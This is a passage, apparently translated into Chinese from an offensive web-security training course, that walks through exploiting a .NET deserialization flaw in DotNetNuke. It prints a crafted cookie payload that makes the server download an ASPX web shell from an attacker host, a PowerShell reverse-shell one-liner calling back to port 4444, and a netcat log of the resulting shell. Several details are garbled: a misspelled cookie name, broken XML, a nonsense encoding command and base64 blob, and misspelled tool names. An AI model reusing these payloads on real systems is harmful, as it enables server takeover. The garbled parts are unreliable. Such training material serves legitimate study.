
# 高级 Web 攻击与利用

## 请求

```
GET /cmdasp.asp HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, Gecko) Chrome/68.0.3440.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US;q=0.9
Cookie: DNNerialization="profile";item="ExpandedEntry";type="System.Data.Services.Internal.ExpandedWrapper[DotNet.Common.Utilities.FileSystemUtils,DotNetNetwork,Version=9.1.0.367,Culture=neutral,PublicKeyToken=null,System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0,Culture=neutral,PublicKeyToken=31f3b85ad3642e35],System.Data.Services,Version=4.0.0,Culture=neutral,PublicKeyToken=b77a5c63594ae08">ExpandedWrapperFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><MethodName>PullFile</MethodName><Parameter type="xsd:string">http://192.168.2.238/cmdasp.asp</Parameter><Parameter type="xsd:string">C:\inetpub\wwwroot\dotnet4\cmdasp.asp</Parameter></ProjectedProperty></ExpandedWrapperFileSystemUtilsObjectDataProvider>
Connection: close
```

![d1c2c08c6e469e3ba5fa2d2a_0]

到此为止，一切都应该按预期工作，我们的恶意负载已经执行。我们可以通过查看 Web 服务器日志来确认 `ASPX` shell 已下载：

```
192.168.2.238 - [07/Sep/13:31] "GET /cmdasp.asp HTTP/1.1" 200 -
```

列表 263 - Web 下载了恶意 `ASPX` shell

最后，我们可以通过访问新上传的文件验证我们的攻击。

![d1c2c08c6e469e3ba5fa2d2a_0]

![d1c2c08c6e469e3ba5fa2d2a_1]

图 169: 可以在 DNS 服务器上访问 `ASPX` shell

此时，我们可以执行任何选择的命令。为了结束攻击，我们将执行一条 `PowerShell` shell 命令并确保它在我们的 `Kali` 虚拟机上运行。

以下列表显示了我们将使用的 `PowerShell` shell 单行命令：

```
$client = New-Object System.Net.Sockets.TCPClient("192.168.2.238",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$type = New-Object System.Text.Encoding;ASCII;$type.GetString($bytes,0,$i);$sendback=(iex $i 2>&1|Out-String);$sendback=$sendback + 'PS ' + ($pwd).Path + ' > ';$sendbyte=$type.GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

为了向 shell 传递复杂命令时避免任何引号和编码问题，我们将将其编码为 `base64` 格式，因为 `PowerShell` 执行 `-EncodedCommand` 参数，这将强制解释器解释 `base64` 编码的可执行文件。请注意 `PowerShell` 使用的是小端 `UTF-16` 编码，这体现在以下列表中：

```
kali@kali: cat powershell.txt
$client = New-Object System.Net.Sockets.TCPClient("192.168.2.238",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$type = New-Object System.Text.Encoding;ASCII;$type.GetString($bytes,0,$i);$sendback=(iex $i 2>&1|Out-String);$sendback=$sendback + 'PS ' + ($pwd).Path + ' > ';$sendbyte=$type.GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
kali@kali: icenc -f ASCII -UTF-16 powershell.txt | base64 -d "JAABABABABQAAABgABoABQABAEEABgAGQYABgABUABQABAEWAB5AMHIAABALGBABQAAQIAABgABUABgABYABoABUABgABUABQAEWAB5AMHIAABALGBABQAAQIAABgABUABgABYABoABUABgABUABQAEWAB5AMHIAABALGBABQAAQIAABgABUABgABYABoABUABgABUABQAEWAB5AMHIAABALGBABQAAQIAABgABUABgABYABoABUABgABUABQAEABABABjABgABABABABABABABABABABABABABABABABgABYABABABUABABABUABQAEWAB5AMHIAABALGBABQAAQIAABgABUABgABYABoABUABgABUABQAEWAB5AMHIAABALGBABQAAQIAABgABUABgABYABoABUABgABUABQAEWAB5
```

# 高级网络攻击与利用

列表 265 - 用于触发反向 shell 的命令

最后，我们的利用程序已经完成，我们已经成功收到了来自请求的反向 shell。

```
kali@kali:~# nc -lvp 4444
[sudo] password for kali: listening on [4444] ...
connect to [192.168.2.238] from WIN-2TU88Q2NS.localdomain [192.168.2.208] 54654
whoami
iispo@defaultappool
PS C:\windows\system32> exit
kali@kali:~#
```

列表 267 - `PowerShell` 反向 shell 将执行，我们收到了一个

### 7.7.1 练习

- 1. 重复上一节描述的攻击并获取反向 shell。
- 2. 原本的 `Mimikatz` 演示应该让你能够从受漏洞的 DNS 服务器泄露信息。生成一个能够实现该目标的利用载荷（`payload`）。

AWASE Copyright ©2019 OffSec Services Ltd. 版权所有。

265

## 7.8 yoserial.net

现在我们已经手动分析并利用了此漏洞，并对 `ObjectProvider` `get`（`gadget`）机制有了深入理解，我们需要提到一个可以为我们自动化许多此类任务的工具。以原始 `yoserial` `Java` 载荷生成器为启发，Alvaro Muñoz 还创建了 `yoserial.net` 载荷生成器，正如名称所示，它专门针对 `.Net` 应用中不安全的对象序列化。

除了本模块提供的 `gadget` 之外，`yoserial.net` 还包含了额外的 `gadget`，如果受漏洞应用程序存在某些特定条件，这些 `gadget` 对攻击者将非常有用。我们强烈建议你检查它提供的载荷以及该工具的工作原理，这将增强你的知识，并允许你可能利用多种 `.Net` 漏洞。

### 7.8.1 .Net 进阶

在本模块中，我们重点关注了分析的 `XmlSerializer` 类。如之前提到的，在 `.Net` 中存在其他序列化器和格式化器，除了 `ObjectDataProvider` 之外还有其他“gadgets”可以用于获取代码执行。虽然这一版本的 `DNN` 中没有发现序列化漏洞，但我们引入了一个额外的漏洞，仅作为练习材料。

为了利用此漏洞，我们鼓励你关注 `DNN` 应用程序中未授权的部分。到此时，你应该对 `.Net` 中 `gadget` 的工作原理有了通理解，并应该能够成功利用此漏洞。`yoserial.net` 载荷生成器应该为你提供许多可以研究的潜在攻击向量思路。

### 7.8.2 Java 进阶

虽然我们在本课程中没有讨论 `Java` 反序列化漏洞，但值得提到，你实验室中的 `ManageEngine` `Applications` `Manager` 实例中存在此类漏洞。我们鼓励你熟悉 `Java` 版本的 `yoserial`，并尝试识别和利用这一漏洞。

## 7.9 总结

在本模块中，我们分析了 `DNN` 平台中的一个漏洞，它清楚地证明了 `.NET` 应用可能会遭受与任何其他语言类似的序列化问题。虽然序列化漏洞在 `PHP` 和 `Java` 应用中发现得频繁，但我们鼓励你在面对 `.NET` 应用时不要忽视这类漏洞，因为它们可能会产生关键性的影响。

> 44 https://github.com/frohoff/yoserial

> 45 https://github.com/pwntester/yoserial.net
